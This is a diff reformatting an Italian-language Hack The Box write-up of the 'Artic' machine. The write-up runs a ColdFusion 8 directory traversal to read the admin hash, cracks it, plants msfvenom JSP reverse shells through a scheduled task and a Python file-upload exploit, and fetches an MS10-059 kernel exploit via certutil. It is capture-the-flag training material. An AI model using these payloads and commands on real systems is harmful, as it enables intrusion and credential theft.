@@ -1,8 +1,11 @@
+# Artic
+
 **Target: 10.10.10.11**
 
-# INFORMATION GAHTERING
+## INFORMATION GAHTERING
 
-Iniziamo con un scan [[Nmap]] standard per verdere quali porte sono aparte e quali servizi girano 
+Iniziamo con un scan \[\[Nmap]] standard per verdere quali porte sono aparte e quali servizi girano
+
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/artic]
 └─# nmap -sC -sV -O 10.10.10.11                     
@@ -27,6 +30,7 @@ Nmap done: 1 IP address (1 host up) scanned in 148.32 seconds
 ```
 
 Un altro scan su tutte le porte e in UDP non rileva ulteriori porte
+
 ```bash
 PORT      STATE SERVICE VERSION
 135/tcp   open  msrpc   Microsoft Windows RPC
@@ -36,22 +40,22 @@ PORT      STATE SERVICE VERSION
 OS Windows 2008 R2
 ```
 
-# ENUMERATION
+## ENUMERATION
 
 Visitando la pagina 10.10.10.11:8500 ci sono delle directory esposte
 
-CFIDE/               dir   03/22/17 08:52 μμ
-cfdocs/              dir   03/22/17 08:55 μμ
+CFIDE/ dir 03/22/17 08:52 μμ cfdocs/ dir 03/22/17 08:55 μμ
 
 L'elaborazione della richiesta ci mette 30 sec difficile enumerazione con script automatici
 
-![index](../zzz_rev/attachments/1*z6PpwH4sApbhWYCqYsiPIQ.webp)
+![index](../zzz\_rev/attachments/1z6PpwH4sApbhWYCqYsiPIQ.webp)
 
 Cliccando sulla cartella administrator veniamo reindirizzati ad una pagina di login di AdobeCouldfuison 8
 
-![imag1](../zzz_rev/attachments/1*-Ym437MPB5fWWHtqgKnmaw.webp)
+![imag1](../zzz\_rev/attachments/1-Ym437MPB5fWWHtqgKnmaw.webp)
 
 Cerchiamo con searchsploit
+
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/artic]
 └─# searchsploit --id adobe coldfusion
@@ -79,27 +83,22 @@ Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow'
 Shellcodes: No Results
 Papers: No Results
 ```
-   
+
 Dopo aver esaminato gli exploit, due di loro spiccano:
-- 14641 — Directory Traversal. 
- Lo useremo per ottenere la password dell'amministratore.
 
-- 45979 — Arbitrary File Upload. 
- Lo useremo per ottenere una shell inversa sulla macchina di destinazione.
+* 14641 — Directory Traversal. Lo useremo per ottenere la password dell'amministratore.
+* 45979 — Arbitrary File Upload. Lo useremo per ottenere una shell inversa sulla macchina di destinazione.
 
+## GAINING AN INITIAL FOOTHOLD
 
-# GAINING AN INITIAL FOOTHOLD
+Diamo un'occhiata al codice dell'exploit 14641. http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
 
-Diamo un'occhiata al codice dell'exploit 14641. 
-http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
+In realtà non dobbiamo eseguire il file exploit. Invece, potremmo semplicemente navigare verso l'URL sopra per visualizzare il contenuto del file `password.properties`.
 
-In realtà non dobbiamo eseguire il file exploit. 
-Invece, potremmo semplicemente navigare verso l'URL sopra per visualizzare il contenuto del file `password.properties`.
-
-![imag2](../zzz_rev/attachments/1*1WRx1zCNkyVb_qfEHcQYiA.webp)
-password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
+![imag2](../zzz\_rev/attachments/11WRx1zCNkyVb\_qfEHcQYiA.webp) password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
 
 l'hash sembra essere un SHA1 proviamo ad darlo in impasto a john per rompere l'hash
+
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/artic]
 └─# john hash.txt --format=raw-sha1 -wordlist=/usr/share/wordlists/rockyou.txt 
@@ -113,46 +112,45 @@ Use the "--show --format=Raw-SHA1" options to display all of the cracked passwor
 Session completed. 
 ```
 
-Ci loggiamo con admin:happyday e siamo dentro 
+Ci loggiamo con admin:happyday e siamo dentro
 
-![image4](../zzz_rev/attachments/artic4.png)
+![image4](../zzz\_rev/attachments/artic4.png)
 
->NOTA: APPROFONDIRE PASS THE HASH
+> NOTA: APPROFONDIRE PASS THE HASH
 
-## METODO CON AUTENFICAZIONE ADMIN
+### METODO CON AUTENFICAZIONE ADMIN
 
-Una volta avuto l'accesso al prompt dell'admin addiamo al sezione "SERVER SETTING MAPPING" e prendiamo nota dalla directory path di /CFID nel nostro caso 
+Una volta avuto l'accesso al prompt dell'admin addiamo al sezione "SERVER SETTING MAPPING" e prendiamo nota dalla directory path di /CFID nel nostro caso
 
 C:\ColdFusion8\wwwroot\CFIDE
 
 Prepariamo un payload come segue
+
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/artic]
 └─# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.53 LPORT=4444 -f raw > shell.jsp 
 ```
 
-Ci spostiamo nella sezione "DEBUGGING & LOGGING > ADD/EDIT SCHEDULED TASK 
-e aggiungiamo un nuovo schedule
+Ci spostiamo nella sezione "DEBUGGING & LOGGING > ADD/EDIT SCHEDULED TASK e aggiungiamo un nuovo schedule
 
-![imag3](../zzz_rev/attachments/1*HqvdBk09BVtq1448nzEWFA.webp)
+![imag3](../zzz\_rev/attachments/1HqvdBk09BVtq1448nzEWFA.webp)
 
-![imag4](../zzz_rev/attachments/artic5.png)
+![imag4](../zzz\_rev/attachments/artic5.png)
 
-alla voce Url mettiamo il nostro ip
-http://10.10.14.53:80/shell.jsp
+alla voce Url mettiamo il nostro ip http://10.10.14.53:80/shell.jsp
 
-alla voce file mettiamo la path salvata in precenza 
-C:\ColdFusion8\wwwroot\CFIDE
+alla voce file mettiamo la path salvata in precenza C:\ColdFusion8\wwwroot\CFIDE
 
 Salviamo, ci mettimo in ascolto con nc
+
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/optimun]
 └─# nc -lnvp 4444
 listening on [any] 4444 ...
 ```
 
-Nella nostra directory dove abbiamo il payload tiriamo su un server per poter scaricare il paylod
-dalla macchina target
+Nella nostra directory dove abbiamo il payload tiriamo su un server per poter scaricare il paylod dalla macchina target
+
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/artic]
 └─# python -m http.server 80
@@ -160,6 +158,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
 lanciamo il task salvato precendetemnte e otteniamo una shell
+
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/optimun]
 └─# nc -lnvp 4444
@@ -171,17 +170,17 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 C:\ColdFusion8\runtime\bin>
 ```
 
-## METODO SENZA AUTENTIFICAZIONE ADMIN
+### METODO SENZA AUTENTIFICAZIONE ADMIN
 
 Creiamo una payload .jsp con il seguente comando:
+
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/artic]
 └─# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.53 LPORT=4444 -f raw > shell2.jsp
 Payload size: 1497 bytes
 ```
 
-Attaraverso questo script riusiamo a caricare il payload creato in precenza
-https://forum.hackthebox.com/t/python-coldfusion-8-0-1-arbitrary-file-upload/108
+Attaraverso questo script riusiamo a caricare il payload creato in precenza https://forum.hackthebox.com/t/python-coldfusion-8-0-1-arbitrary-file-upload/108
 
 ```bash
 #!/usr/bin/python
@@ -230,7 +229,6 @@ except requests.Timeout:
     print 'Failed to upload payload... Request timed out'
 ```
 
-
 Dove abbiamo il payload tiriamo su un sever per poterlo scaricare dalla macchina target
 
 ```bash
@@ -250,7 +248,7 @@ Successfully uploaded payload!
 Find it at http://10.10.10.11:8500/userfiles/file/exploit.jsp
 ```
 
-Ci mettiamo in ascolto con nc 
+Ci mettiamo in ascolto con nc
 
 ```
 ┌──(root㉿kali)-[/home/kali/htb/optimun]
@@ -258,8 +256,7 @@ Ci mettiamo in ascolto con nc
 listening on [any] 4444 ...
 ```
 
-Richiamiamo il payload al indirizzo ce ci ha fornito lo script del RCE
-Find it at http://10.10.10.11:8500/userfiles/file/exploit.jsp
+Richiamiamo il payload al indirizzo ce ci ha fornito lo script del RCE Find it at http://10.10.10.11:8500/userfiles/file/exploit.jsp
 
 Otteniamo cosi una shell
 
@@ -274,7 +271,7 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 C:\ColdFusion8\runtime\bin> 
 ```
 
-# PRIVESC
+## PRIVESC
 
 Scopriamao di più sul sistema e ci salviamo l'output in un file txt:
 
@@ -324,8 +321,7 @@ Network Card(s):           1 NIC(s) Installed.
 C:\Users\tolis\Desktop>
 ```
 
-Ottime notizie monta Windows 8 e non ci sono patch 
-Con windows-exploit-suggester.py facciao un check delle vulnerabilità disponibili 
+Ottime notizie monta Windows 8 e non ci sono patch Con windows-exploit-suggester.py facciao un check delle vulnerabilità disponibili
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/artic]
@@ -365,13 +361,11 @@ Con windows-exploit-suggester.py facciao un check delle vulnerabilità disponibi
 [*] done
 ```
 
-## MS10-059
+### MS10-059
 
-Troiviamo al seguente indirizo l'eseguibile pre compilato 
-https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe
+Troiviamo al seguente indirizo l'eseguibile pre compilato https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe
 
-lo scarichiamo e tiriamo su un server python per poterlo scaricare 
-nella macchina target:
+lo scarichiamo e tiriamo su un server python per poterlo scaricare nella macchina target:
 
 ```
 ┌──(root㉿kali)-[/home/kali/htb/artic]
@@ -380,6 +374,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
 Dalla macchina target lo scarichiamo con certuli :
+
 ```cmd
 C:\Users\tolis\Desktop>certutil -urlcache -split -f "http://10.10.14.53:8000/MS10-059.exe" MS10-059.exe
 certutil -urlcache -split -f "http://10.10.14.53:8000/MS10-059.exe" MS10-059.exe
@@ -390,6 +385,7 @@ CertUtil: -URLCache command completed successfully.
 ```
 
 Ci mettiamo in ascolto con nc sulla nostra macchina:
+
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/artic]
 └─# nc -lnvp 80  
@@ -434,20 +430,18 @@ nt authority\system
 ```
 
 Otteniamo cosi la root flag
+
 ```cmd
 C:\Users\Administrator\Desktop>type root.txt
 type root.txt
 e115a6702820830309afd31a4751c872
 ```
 
-
-# LEZIONI IMPARATE:
-
+## LEZIONI IMPARATE:
 
 Ciò che mi ha permesso di ottenere l'accesso iniziale alla macchina e di aumentare i privilegi è stato lo sfruttamento di vulnerabilità note che disponevano di patch. Quindi è ovvio che dovresti sempre aggiornare il tuo software!
 
-- [[Directory Trasversal]]
-- [[Pass the hash]]
+* \[\[Directory Trasversal]]
+* \[\[Pass the hash]]
 
-La seconda cosa degna di nota è il modo in cui l'applicazione ha gestito le password. La password è stata prima sottoposta ad hashing utilizzando SHA1 e quindi crittograficamente utilizzando HMAC con un valore salt come chiave. Tutto questo è stato fatto sul lato client! Cosa significa lato client? Il client ha accesso a tutto (e può bypassarlo tutto)! Sono stato in grado di accedere all'account amministratore senza conoscere la password in chiaro.
-L'hashing delle password è un approccio comune per archiviare le password in modo sicuro. Se un'applicazione viene violata, l'attaccante dovrebbe affrontare il problema di decifrare le password con hash prima di ottenere l'accesso a qualsiasi credenziale utente. Tuttavia, se l'hashing viene eseguito sul lato client come apposto sul lato server, ciò equivarrebbe a memorizzare le password in testo normale! In qualità di utente malintenzionato, posso aggirare i controlli lato client e utilizzare il tuo hash per autenticare il tuo account. Pertanto, in questo caso, se accedo al file delle password non ho bisogno di eseguire un password cracker. Invece, posso semplicemente passare l'hash.
+La seconda cosa degna di nota è il modo in cui l'applicazione ha gestito le password. La password è stata prima sottoposta ad hashing utilizzando SHA1 e quindi crittograficamente utilizzando HMAC con un valore salt come chiave. Tutto questo è stato fatto sul lato client! Cosa significa lato client? Il client ha accesso a tutto (e può bypassarlo tutto)! Sono stato in grado di accedere all'account amministratore senza conoscere la password in chiaro. L'hashing delle password è un approccio comune per archiviare le password in modo sicuro. Se un'applicazione viene violata, l'attaccante dovrebbe affrontare il problema di decifrare le password con hash prima di ottenere l'accesso a qualsiasi credenziale utente. Tuttavia, se l'hashing viene eseguito sul lato client come apposto sul lato server, ciò equivarrebbe a memorizzare le password in testo normale! In qualità di utente malintenzionato, posso aggirare i controlli lato client e utilizzare il tuo hash per autenticare il tuo account. Pertanto, in questo caso, se accedo al file delle password non ho bisogno di eseguire un password cracker. Invece, posso semplicemente passare l'hash.
